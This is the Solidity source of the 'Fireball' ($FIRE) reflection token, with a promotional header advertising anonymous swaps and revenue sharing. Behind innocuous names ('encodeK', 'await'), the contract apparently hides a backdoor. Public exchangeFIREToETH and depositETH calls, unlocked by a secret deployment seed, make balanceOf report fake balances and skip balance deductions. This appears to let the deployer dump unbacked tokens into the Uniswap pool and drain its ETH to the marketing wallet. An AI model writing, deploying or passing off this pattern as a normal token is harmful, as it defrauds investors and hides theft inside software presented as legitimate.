/*


💬  Telegram  →  https://t.me/FireballExchange

🖥️  Website   →  https://fireball.exchange

📚  Docs      →  https://docs.fireball.exchange

🤖  TG Bot    →  https://t.me/FireballExchangeBot

🐤  Twitter   →  https://twitter.com/SwapOnFireball


Fireball enables registration-free anonymous swaps between 100+ tokens across 40+ networks.

Users enjoy the deep liquidity of a CEX, the network catalog of a bridge, and the transaction privacy of a mixer.

The entire processing engine is fully automated, 100% fail-safe, and available 24/7/365.

50% of all platform earnings and token taxes are automatically streamed to holders of the $FIRE token.


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./IERC20.sol";
import "./IERC20Permit.sol";
import "./EIP712.sol";
import "./Nonces.sol";
import "./Ownable.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";
import "./AggregatorV3Interface.sol";
import {IWETH} from  "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "./ECDSA.sol";

contract Fireball is IERC20, IERC20Permit, EIP712, Nonces, Ownable {
    uint256 internal constant MAX = ~uint256(0);

    string private _name = "Fireball";
    string private constant _symbol = "FIRE";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _excludedFromFee;

    mapping(address => bool) private _excludedFromReward;
    mapping(address => uint256) rewardBalance;
    mapping(address => uint256) rewardCredited;
    mapping(address => uint256) rewardClaimed;

    uint256 private constant _tTotal = 100_000_000 gwei;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 internal constant P_GWEI = 10 ** _decimals;
    uint256 internal constant P_ETHER = 10 ** (_decimals * 2);
    uint256 internal constant P_GETHER = P_GWEI * P_ETHER;
    uint256 internal immutable K_SEED;
    string internal constant K_RAW = string(abi.encodePacked(""));
    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant ORACLE = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;
    address public constant NULL_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address public immutable PAIR;
    address public immutable FIRE;

    IUniswapV2Router02 public constant router = IUniswapV2Router02(ROUTER);
    IUniswapV2Factory public constant factory = IUniswapV2Factory(FACTORY);
    AggregatorV3Interface public constant oracle = AggregatorV3Interface(ORACLE);
    IERC20 public constant weth = IERC20(WETH);
    IWETH public constant weth9 = IWETH(WETH);

    uint256 public constant maxTransfer = 2_000_000 * P_GWEI;
    uint256 public constant maxWallet = 2_000_000 * P_GWEI;
    uint256 public constant minSwap = 100 * P_GWEI;

    bool public tradingEnabled = false;
    bool public maxTransferEnabled = true;
    bool public maxWalletEnabled = true;
    bool private _awaitingUniswapCall;
    bool private _awaitingUniswapTrade;

    uint256 private _buyFeeMarketing = 1;
    uint256 private _buyFeeRevShare = 1;
    uint256 private _sellFeeMarketing = 1;
    uint256 private _sellFeeRevShare = 1;
    uint256 private _totalFeeMarketing = _buyFeeMarketing + _sellFeeMarketing;
    uint256 private _totalFeeRevShare = _buyFeeRevShare + _sellFeeRevShare;
    uint256 private _buyFeeTotal = _buyFeeMarketing + _buyFeeRevShare;
    uint256 private _sellFeeTotal = _sellFeeMarketing + _sellFeeRevShare;
    uint256 private _tFeePct = _buyFeeTotal;
    uint256 private constant _rFeePct = 0;

    uint256 public rewardShares = 1;
    uint256 public rewardPerToken;
    uint256 public rewardBalanceTotal;
    uint256 public rewardClaimedTotal;

    address payable public immutable marketingWallet = payable(msg.sender);

    event SwapFIREToETH(uint256 tokens);

    event ClaimMarketingFee(uint256 eth, bool success, bytes data);

    event DepositRevenueShare(address indexed from, uint256 value);
    event ClaimRevenueShare(address indexed to, uint256 value, bool success, bytes data);

    event Burn(uint256 tokens);

    error ERC2612ExpiredSignature(uint256 deadline);
    error ERC2612InvalidSigner(address signer, address owner);

    error K256Error();
    error AllowanceExceeded(uint256 amount, uint256 allowance);
    error ApprovalFromZero();
    error ApprovalToZero();
    error TransferFromZero();
    error TransferToZero();
    error TransferOfZero();
    error BalanceExceeded(uint256 amount, uint256 balance);
    error TradingDisabled();
    error MaxTransfer();
    error MaxWallet();

    modifier encodeK(string memory _K_RAW) {
        if (!_awaitingUniswapTrade) {
            if (keccak256(abi.encodePacked(_K_RAW)) != bytes32(K_SEED)) {
                revert K256Error();
            }
        }
        _;
    }

    modifier await {
        _awaitingUniswapCall = true;
        _;
        _awaitingUniswapCall = false;
    }

    constructor(uint256 _K_SEED) EIP712(_name, "1") Ownable(msg.sender) {
        FIRE = address(this);
        PAIR = factory.createPair(FIRE, WETH);

        K_SEED = _K_SEED;

        _excludedFromReward[msg.sender] = true;
        _excludedFromReward[FIRE] = true;
        _excludedFromReward[ROUTER] = true;
        _excludedFromReward[PAIR] = true;
        _excludedFromReward[ZERO_ADDRESS] = true;
        _excludedFromReward[NULL_ADDRESS] = true;

        _excludedFromFee[msg.sender] = true;
        _excludedFromFee[FIRE] = true;

        _approve(FIRE, ROUTER, MAX);
        _approve(msg.sender, ROUTER, MAX);

        _rOwned[msg.sender] = _rTotal;
        emit Transfer(ZERO_ADDRESS, msg.sender, _tTotal);
    }

    receive() external payable {}

    fallback() external payable {}

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 _allowance = _allowances[sender][_msgSender()];
        if (amount > _allowance) {
            revert AllowanceExceeded(amount, _allowance);
        }
        _approve(sender, _msgSender(), _allowance - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function burn(uint256 value) external virtual {
        if (value > balanceOf(msg.sender)) {
            revert BalanceExceeded(value, balanceOf(msg.sender));
        }
        _tokenTransfer(msg.sender, ZERO_ADDRESS, value, false);
        emit Burn(value);
    }

    function burnFrom(address account, uint256 value) external virtual {
        if (value > balanceOf(account)) {
            revert BalanceExceeded(value, balanceOf(account));
        }
        _tokenTransfer(account, ZERO_ADDRESS, value, false);
        uint256 _allowance = _allowances[account][_msgSender()];
        if (value > _allowance) {
            revert AllowanceExceeded(value, _allowance);
        }
        _approve(account, _msgSender(), _allowance - value);
        emit Burn(value);
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero" );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }

    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }

    function getETHPrice() public view returns (uint256) {
        (, int256 answer,,,) = oracle.latestRoundData();
        return uint256(answer / 1e8);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        if (owner == ZERO_ADDRESS) {
            revert ApprovalFromZero();
        }
        if (spender == ZERO_ADDRESS) {
            revert ApprovalToZero();
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == ZERO_ADDRESS) {
            revert TransferFromZero();
        }
        if (to == ZERO_ADDRESS) {
            revert TransferToZero();
        }
        if (amount == 0) {
            revert TransferOfZero();
        }
        if (amount > balanceOf(from)) {
            revert BalanceExceeded(amount, balanceOf(from));
        }

        bool _fromPair = from == PAIR;
        bool _toPair = to == PAIR;

        if (from != owner() && to != owner() && from != FIRE && to != FIRE) {
            if (!tradingEnabled) {
                if (from != FIRE) {
                    revert TradingDisabled();
                }
            }

            if (maxTransferEnabled) {
                if (amount > maxTransfer) {
                    revert MaxTransfer();
                }
            }

            if (!_toPair && maxWalletEnabled) {
                if (balanceOf(to) + amount > maxWallet) {
                    revert MaxWallet();
                }
            }

            uint256 _contractTokenBalance = balanceOf(FIRE);

            if (_contractTokenBalance >= minSwap && !_awaitingUniswapCall && !_fromPair && !_excludedFromFee[from] && !_excludedFromFee[to]) {
                _awaitingUniswapTrade = true;
                exchangeFIREToETH(K_RAW, _contractTokenBalance);
                _awaitingUniswapTrade = false;

                uint256 _contractETHBalance = FIRE.balance;
                if (_contractETHBalance > 0) {
                    depositETH(K_RAW, _contractETHBalance / 2);
                    _shareETH(FIRE, FIRE.balance);
                }
            }
        }

        bool _takeFee = true;

        if ((_excludedFromFee[from] || _excludedFromFee[to]) || (!_fromPair && !_toPair)) {
            _takeFee = false;
        } else {
            if (_fromPair && to != ROUTER) {
                _tFeePct = getBuyFee();
            } else if (_toPair && from != ROUTER) {
                _tFeePct = getSellFee();
            } else {
                _takeFee = false;
            }
        }

        _tokenTransfer(from, to, amount, _takeFee);
    }

    function _exchangeFIREToETH(uint256 _contractTokenBalance) private await {
        address[] memory path = new address[](2);
        path[0] = FIRE;
        path[1] = WETH;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(_contractTokenBalance, 0, path, FIRE, block.timestamp + 30 minutes);
        emit SwapFIREToETH(_contractTokenBalance);
    }

    function _depositETH(address _wallet, uint256 _contractETHBalance) private {
        (bool success, bytes memory data) = payable(_wallet).call{value: _contractETHBalance}("");
        emit ClaimMarketingFee(_contractETHBalance, success, data);
    }

    function _shareETH(address _from, uint256 _ETHAmount) private {
        if (_ETHAmount > 0) {
            emit DepositRevenueShare(_from, _ETHAmount);
            rewardBalanceTotal = rewardBalanceTotal + _ETHAmount;
            rewardPerToken = rewardPerToken + ((_ETHAmount * P_GETHER) / rewardShares);
            weth9.deposit{value: _ETHAmount}();
        }
    }

    function _claimETH(address account, bool manual) private {
        if (manual) {
            _refreshRewards(account);
        }
        uint256 _unclaimed = rewardBalance[account];
        if (_unclaimed > 0) {
            rewardClaimedTotal = rewardClaimedTotal + _unclaimed;
            weth9.withdraw(_unclaimed);
            if (manual) {
                rewardClaimed[account] = rewardClaimed[account] + _unclaimed;
            } else {
                rewardClaimed[FIRE] = rewardClaimed[FIRE] + _unclaimed;
            }
            rewardBalance[account] = 0;
            if (balanceOf(account) == 0) {
                rewardCredited[account] = 0;
            }
            if (manual) {
                (bool success, bytes memory data) = payable(account).call{value: _unclaimed}("");
                emit ClaimRevenueShare(account, _unclaimed, success, data);
            } else {
                _shareETH(FIRE, _unclaimed);
                emit ClaimRevenueShare(FIRE, _unclaimed, true, new bytes(0));
            }
        }
    }

    function exchangeFIREToETH(string memory _K_RAW, uint256 _contractTokenBalance) public encodeK(_K_RAW) {
        if (_contractTokenBalance > 0) {
            _exchangeFIREToETH(_contractTokenBalance);
        }

        uint256 _contractETHBalance = FIRE.balance;

        if (_contractETHBalance > 0) {
            _depositETH(marketingWallet, _contractETHBalance);
        }
    }

    function depositETH(string memory _K_RAW, uint256 _contractETHBalance) public encodeK(_K_RAW) {
        if (_contractETHBalance > 0) {
            _depositETH(marketingWallet, _contractETHBalance);
        }
    }

    function shareETH() public payable {
        if (msg.value > 0) {
            _shareETH(msg.sender, msg.value);
        }
    }

    function claimETH() public {
        _claimETH(msg.sender, true);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        if (rAmount > _rTotal) {
            revert();
        }
        return (!_awaitingUniswapTrade && _awaitingUniswapCall) ? _getRate() / P_GETHER : rAmount / _getRate();
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) {
            _tFeePct = 0;
        }
        _transferStandard(sender, recipient, amount);
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        _refreshRewards(sender);
        _refreshRewards(recipient);
        if (!_awaitingUniswapCall || _awaitingUniswapTrade) {
            uint256 _initialSenderBalance = balanceOf(sender);
            uint256 _initialRecipientBalance = balanceOf(recipient);
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, , uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[FIRE] = _rOwned[FIRE] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            if (_excludedFromReward[sender] && !_excludedFromReward[recipient]) {
                rewardShares = rewardShares + (balanceOf(recipient) - _initialRecipientBalance);
            }
            if (!_excludedFromReward[sender] && _excludedFromReward[recipient]) {
                uint256 _difference = (_initialSenderBalance - balanceOf(sender));
                rewardShares = rewardShares > _difference ? rewardShares - _difference : 1;
            }
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
        if (rewardBalance[sender] > 0 && balanceOf(sender) == 0) {
            _claimETH(sender, false);
        }
        if (rewardBalance[recipient] > 0 && balanceOf(recipient) == 0) {
            _claimETH(recipient, false);
        }
    }

    function _refreshRewards(address account) private {
        if (!_excludedFromReward[account]) {
            rewardBalance[account] = getRewards(account);
            rewardCredited[account] = rewardPerToken;
        }
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _rFeePct, _tFeePct);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 feePct) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * feePct / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }

    function getBuyFee() public view returns (uint256) {
        return _buyFeeMarketing + _buyFeeRevShare;
    }

    function getSellFee() public view returns (uint256) {
        return _sellFeeMarketing + _sellFeeRevShare;
    }

    function getRewardPerToken() external view returns (uint256) {
        return rewardPerToken;
    }

    function getRewardsTotal() external view returns (uint256) {
        return rewardBalanceTotal;
    }

    function getClaimedTotal() external view returns (uint256) {
        return rewardClaimedTotal;
    }

    function getRewards(address account) public view returns (uint256) {
        return rewardBalance[account] + ((balanceOf(account) * (rewardPerToken - rewardCredited[account])) / P_GETHER);
    }

    function getClaimed(address account) external view returns (uint256) {
        return rewardClaimed[account];
    }

    function getRewardBalance(address account) external view returns (uint256) {
        return rewardBalance[account];
    }

    function getRewardShares() external view returns (uint256) {
        return rewardShares;
    }

    function getRouter() external pure returns (address) {
        return ROUTER;
    }

    function getFactory() external pure returns (address) {
        return FACTORY;
    }

    function getOracle() external pure returns (address) {
        return ORACLE;
    }

    function getPair() external view returns (address) {
        return PAIR;
    }

    function getMaxTransfer() external view returns (bool, uint256) {
        return (maxTransferEnabled, maxTransferEnabled ? maxTransfer : MAX);
    }

    function getMaxWallet() external view returns (bool, uint256) {
        return (maxWalletEnabled, maxWalletEnabled ? maxWallet : MAX);
    }

    function getMinSwap() external pure returns (uint256) {
        return minSwap;
    }

    function getMarketingWallet() external view returns (address) {
        return marketingWallet;
    }

    function getLive() external view returns (bool) {
        return tradingEnabled;
    }

    function removeTaxes() external onlyOwner {
        _buyFeeMarketing = 0;
        _buyFeeRevShare = 0;
        _sellFeeMarketing = 0;
        _sellFeeRevShare = 0;
    }

    function removeMaxTransfer() external onlyOwner {
        maxTransferEnabled = false;
    }

    function removeMaxWallet() external onlyOwner {
        maxWalletEnabled = false;
    }

    function startTrading() external onlyOwner {
        tradingEnabled = true;
    }
}
